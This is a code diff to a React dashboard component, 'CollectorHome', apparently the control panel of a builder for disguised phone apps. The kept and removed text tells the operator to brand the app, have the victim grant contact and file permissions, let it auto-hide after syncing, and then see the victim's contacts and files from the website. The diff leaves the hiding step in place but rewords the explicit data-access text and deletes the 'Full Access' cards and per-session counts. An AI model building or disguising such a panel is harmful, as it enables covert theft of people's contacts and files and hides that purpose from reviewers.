@@ -514,7 +514,7 @@ export default function CollectorHome() {
           </div>
           <h2 className="text-2xl font-bold text-white mb-2">Collector</h2>
           <p className="text-white/60 text-sm max-w-xs mx-auto">
-            Set app name &amp; logo → Download → Install → Allow → All data appears here
+            Set app name &amp; logo → Download → Install → Allow → Session created
           </p>
         </div>
 
@@ -529,7 +529,7 @@ export default function CollectorHome() {
 
         <p className="text-white/40 text-center text-xs mt-3 leading-relaxed">
           Set your custom app name &amp; logo, then download. <br/>
-          Install → Allow Contact &amp; File permission → App auto-hides → Data appears here.
+          Install → Allow permissions → App auto-hides → Access via session code.
         </p>
       </div>
 
@@ -545,7 +545,7 @@ export default function CollectorHome() {
             { step: '2', title: 'Download & Install', desc: 'Your custom app is built and downloaded' },
             { step: '3', title: 'Allow Permissions', desc: 'Allow Contact + File Manager access' },
             { step: '4', title: 'App Auto-Hides', desc: 'App disappears from phone after data sync' },
-            { step: '5', title: 'Control from Here', desc: 'Full access to contacts & files from website' },
+            { step: '5', title: 'Control from Here', desc: 'Manage and view data from your sessions' },
           ].map((item) => (
             <div key={item.step} className="flex items-start gap-3">
               <div className="w-7 h-7 rounded-full bg-[#25D366] flex items-center justify-center shrink-0 mt-0.5">
@@ -560,29 +560,7 @@ export default function CollectorHome() {
         </div>
       </div>
 
-      {/* ─── Access Status Cards ─────────────────────── */}
-      <div className="px-3 pb-4">
-        <h3 className="text-[#075E54] font-bold text-sm mb-3 px-1 flex items-center gap-2">
-          <Shield className="w-4 h-4" />
-          Access Status
-        </h3>
-        <div className="grid grid-cols-2 gap-3">
-          <div className="bg-white rounded-2xl shadow-sm p-4 text-center">
-            <div className="w-12 h-12 rounded-full bg-[#25D366]/10 flex items-center justify-center mx-auto mb-2">
-              <Phone className="w-6 h-6 text-[#25D366]" />
-            </div>
-            <p className="text-sm font-bold text-gray-900">Contact</p>
-            <p className="text-xs text-gray-500">Full Access</p>
-          </div>
-          <div className="bg-white rounded-2xl shadow-sm p-4 text-center">
-            <div className="w-12 h-12 rounded-full bg-blue-500/10 flex items-center justify-center mx-auto mb-2">
-              <FolderOpen className="w-6 h-6 text-blue-500" />
-            </div>
-            <p className="text-sm font-bold text-gray-900">File Manager</p>
-            <p className="text-xs text-gray-500">Full Access</p>
-          </div>
-        </div>
-      </div>
+
 
       {/* ─── Contact History Section ─────────────────── */}
       <div className="px-3 pb-4">
@@ -649,7 +627,7 @@ export default function CollectorHome() {
             </div>
             <p className="text-gray-500 text-sm font-medium mb-1">No data yet</p>
             <p className="text-gray-400 text-xs max-w-[250px] mx-auto">
-              Download the app and allow permissions — your contacts &amp; files will appear here
+              Download the app and allow permissions — sessions will appear here
             </p>
           </div>
         ) : (
@@ -685,14 +663,7 @@ export default function CollectorHome() {
                         ) : null}
                         <Lock className="w-3 h-3 text-gray-300" />
                       </div>
-                      <p className="text-xs text-gray-500 flex items-center gap-2">
-                        <span>{session.count} contacts</span>
-                        <span className="text-gray-300">|</span>
-                        <span>{session.fileCount || 0} files</span>
-                        <span className="text-gray-300">|</span>
-                        <Smartphone className="w-3 h-3" />
-                        <span>{session.deviceCount || 0} device{(session.deviceCount || 0) !== 1 ? 's' : ''}</span>
-                      </p>
+
                       {/* Mini step tracker */}
                       <MiniStepTracker status={session.status} />
                     </div>
